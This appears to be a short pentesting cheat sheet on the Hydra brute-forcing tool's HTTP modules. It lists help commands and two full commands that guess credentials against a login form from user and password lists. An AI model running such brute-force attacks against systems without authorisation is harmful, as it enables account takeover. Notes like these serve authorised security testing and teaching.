# Hydra

TODO: Provide every syntax of it's usage for hydra to brute force whatever type of http and provide an example of how to use it

## 01 - HTTP\[s\]-HEAD

`$ hydra -U http[s]-head`

## 02 - HTTP\[s\]-GET

`$ hydra -U http[s]-get`

## 03 - HTTP\[s\]-POST

`$ hydra -U http[s]-post`

## 04 - HTTP\[s\]-GET-FORM

`$ hydra -U http[s]-get-form`

## 05 - HTTP\[s\]-POST-FORM

`$ hydra -U http[s]-post-form`

`$ hydra http[s]-form-post <URL_path>:<form parameters>:<condition string>[:<optional>:<optional>]`

`$ hydra -L users.lst -P passwords.lst http-form-post "/login.php:user=^USER^&pass=^PASS^:Incorrect Password" -vV -f <IP>`

`$ hydra -L users.lst -P passwords.lst http-form-post "/login.php:user=^USER^&pass=^PASS^:F=<form name='login'" -vV -f <IP>`

## 06 - HTTP-PROXY

`$ hydra -U http-proxy`

## 07 - HTTP-PROXY-URLEnum

`$ hydra -U http-proxy-urlenum`